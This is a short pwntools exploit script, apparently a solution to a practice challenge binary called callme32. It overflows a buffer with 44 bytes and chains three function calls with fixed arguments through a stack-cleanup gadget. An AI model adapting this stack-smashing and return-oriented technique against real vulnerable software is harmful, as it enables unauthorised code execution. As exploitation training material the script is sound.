from pwn import *
p= process("./callme32")
a1= 0xdeadbeef
a2= 0xcafebabe
a3= 0xd00df00d
c1= 0x080484f0
c2= 0x08048550
c3= 0x080484e0
pg= 0x080487f9
payload= b"A"*44
payload+= p32(c1) +  p32(pg) + p32(a1) + p32(a2) + p32(a3)
payload+= p32(c2) + p32(pg) + p32(a1) + p32(a2) + p32(a3)
payload+= p32(c3) + p32(pg) + p32(a1) + p32(a2) + p32(a3)
p. sendline(payload)
p.recv()
p.interactive()